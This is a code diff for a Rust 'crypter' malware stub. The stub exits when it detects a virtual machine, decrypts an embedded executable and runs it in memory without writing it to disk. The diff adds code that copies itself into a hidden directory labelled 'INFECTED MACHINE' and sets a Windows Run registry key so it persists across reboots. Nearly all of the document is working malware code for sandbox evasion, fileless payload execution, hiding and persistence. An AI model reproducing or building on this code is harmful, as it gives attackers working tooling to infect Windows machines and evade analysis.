@@ -3,16 +3,30 @@ use aes::cipher::{BlockDecrypt, KeyInit,
     generic_array::GenericArray,
 };
 use inside_vm::inside_vm;
-use std::io::{Read, Cursor};
+use std::process::Command;
+use std::{fs, env};
+use std::io::{Read, Cursor, self};
 use std::io::Result;
+use std::path::Path;
+use winreg::enums::{HKEY_CURRENT_USER, KEY_ALL_ACCESS};
+use winreg::RegKey;
 
 
-fn main(){
+fn main() {
+
     if inside_vm(){
+
         println!("This is in a vm");
+
         std::process::exit(0);
+
     } else {
+
         println!("NO VM");
+
+        create_infected_directory();
+        persistence();
+
         let pe_bytes = decrypt_file().unwrap();
         fileless(pe_bytes);
     }
@@ -45,7 +59,52 @@ fn decrypt_file() -> Result<Vec<u8>> {
     Ok(decrypted_bytes, )
 }
 
-fn fileless(bytes: Vec<u8>){
+fn create_infected_directory() -> io::Result<()> {
+    let infected_dir = Path::new("C:/Rust Crypter - INFECTED MACHINE");
+    fs::create_dir_all(&infected_dir)?;
+
+    let current_exe = env::current_exe()?;
+    let current_exe_filename = current_exe
+        .file_name();
+    
+    let infected_exe_path = infected_dir.join(current_exe_filename.unwrap());
+    fs::copy(&current_exe, &infected_exe_path)?;
+
+    if cfg!(target_os = "windows") {
+        Command::new("attrib")
+            .arg("+h")
+            .arg(infected_dir.as_os_str())
+            .output()?;
+        Command::new("attrib")
+            .arg("+h")
+            .arg(infected_exe_path.as_os_str())
+            .output()?;
+    }
+
+    Ok(())
+}
+
+fn persistence() -> io::Result<()> {
+
+    if let Ok(current_exe) = env::current_exe() {
+        if let Some(file_name) = current_exe.file_stem() {
+
+            let executable_name = file_name.to_string_lossy();
+            let directory_path = "C:/Rust Crypter - INFECTED MACHINE/";
+            let file_path = format!("{}{}.exe", directory_path, executable_name);
+
+            // Open the "Run" registry key
+            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+            let run_key = hkcu.open_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_ALL_ACCESS)?;
+
+            // Add the executable path to the "Run" registry key
+            run_key.set_value("RustCrypter", &file_path).err();
+        }
+    }
+    Ok(())
+}
+
+fn fileless(bytes: Vec<u8>) {
     unsafe {
         memexec::memexec_exe(&bytes).unwrap();
     }
